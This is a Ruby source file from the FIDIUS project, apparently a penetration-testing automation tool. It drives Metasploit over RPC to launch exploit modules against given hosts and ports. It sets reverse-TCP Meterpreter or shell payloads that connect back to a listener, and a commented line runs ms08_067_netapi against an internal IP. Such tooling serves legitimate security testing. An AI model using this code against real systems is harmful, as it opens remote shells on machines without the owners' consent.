module FIDIUS
  module Action
    module Exploit
      class Exploit

        def initialize
          begin
            initialize_rpc_connection
          rescue Exception => e
            # TODO: what to do if this fails?
            raise "could not create rpc connection: #{e}"
          end
        end

        # timeout
        @@TIMEOUT = 30

        # @return [Array] Host IP addresses, which will/were not be
        #                 exploited.
        attr_reader :excluded_hosts

        # Runs an exploit against given +remote host port+ or +serivce+. If
        # +non_blocking+ is set to +true+ this method will return a thread
        # which has to be handled by caller. Otherwise the thread will be
        # joined after at least the amount of seconds which is set in
        # this class or if +timeout+ is given as parameter and not +nil+
        # the amount of seconds given by timeout parameter.
        #
        # DMKE: the last sentence does not parse...
        #
        # @param rhost Remote host.
        # @param rport Remote port.
        # @param rproto Protocol.
        # @param [String] modname Metasploits +module.fullname+
        # @param [Boolean] non_blocking +true+ if the exploit should run in
        #                  a new thread.
        # @param [Integer] timeout A timeout.
        # @return [Thread] If +non_blocking+ is set to +true+, this method
        #                  may return a running thread (which might be
        #                  already finished at the point of return). Otherwise,
        #                  after either the given +timeout+ or a local
        #                  +@@TIMEOUT+, a finished thread is returned.
        def run_exploit_against_host_at_port rhost, rport, rproto, mod_name, non_blocking = false, timeout = nil
          return if session_exists? rhost
          begin
            mod = nil
            unless (mod = @framework.modules.create(mod_name))
              puts("Failed to initilize #{mod_name}")
              return
            end

            # TODO: rhost and rport are set already in get_matching_modules_by_ports
            mod.datastore['RHOST'] = rhost
            if(rport)
              mod.datastore['RPORT'] = rport.to_s
            end
            mod.datastore['LHOST']   = 	@lhost ? @lhost : Rex::Socket.source_address(rhost)
            mod.datastore['LPORT']   = 	@lport ? @lport : (rand(0x8fff) + 4000).to_s
            if (mod.datastore['LHOST'] == '127.0.0.1')
              puts("Failed to determine listener address for target #{rhost}...")
              return
            end
            # TODO: win / linux 64bit und ipv6 support
            if(mod.fullname =~ /\/windows\//)
              mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
            elsif(mod.fullname =~ /\/linux\//)
              mod.datastore['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
            else
              mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
            end
            if(@framework.jobs.keys.length >= @@MAX_CONCURRENT_JOBS)
              puts("Job limit reached, waiting on modules to finish...") if $MY_DEBUG
              while(@framework.jobs.keys.length >= @@MAX_CONCURRENT_JOBS)
                ::IO.select(nil, nil, nil, 0.25)
              end
            end
            cur_thread = Thread.new(mod) do |thread_mod|
              begin
                time = Time.now.to_f
                ::Timeout.timeout(@@TIMEOUT) do
                  case thread_mod.type
                  when Msf::MODULE_EXPLOIT
                    thread_mod.exploit_simple(
                                              'Payload'  => thread_mod.datastore['PAYLOAD'],
                                              'Quiet'    => true,
                                              'RunAsJob' => false
                                              )
                  when Msf::MODULE_AUX
                    thread_mod.run_simple(
                                          'Quiet'    => true,
                                          'RunAsJob' => false
                                          )
                  end
                end
              rescue ::Timeout::Error
                puts(" >> subnet_manager timeout from #{mod_name} after #{Time.now.to_f - stime} seconds") if $MY_DEBUG
              rescue ::Exception
                puts(" >> subnet_manager exception during launch from #{mod_name}: #{$!} ") if $MY_DEBUG
              end
            end
          rescue ::Interrupt
            raise $!
          rescue ::Exception
            puts(" >> subnet_manager: exception from #{mod_name}: #{$!} #{$!.backtrace}")
          end
          return cur_thread if non_blocking
          cur_thread.join timeout
        end

      private
        def session_exists? rhost
          # TODO remove @framework
          @framework.sessions.each_value do |s|
            return true if rhost == s.target_host
          end
          false
        end

        def initialize_rpc_connection
          begin
            config = YAML.load_file(File.expand_path '../../../../rpc.yml', __FILE__)
          rescue
            raise ArgumentError, "No rpc.yml found"
          end

          rpc = RPCClient.new(
            :host => config[:hostname],
            :port => config[:port],
            :ssl  => config[:use_ssl] == 'true' ? true : false
          )

          user = config[:username]
          pass = config[:password]
          res = rpc.login(user, pass)

          puts "#{res.inspect}"
          puts rpc.call("core.version")
          #puts rpc.call("module.execute","exploit","windows/smb/ms08_067_netapi",
          #{"PAYLOAD"=>"windows/meterpreter/bind_tcp","RHOST"=>"10.20.20.1"})

          #$rpc.call("session.list")
          #$rpc.call("job.list")
          #$rpc.call("job.info",0)
          @rpc = rpc
        end

      end # class Exploit
    end # module Exploit
  end # module Action
end # module FIDIUS

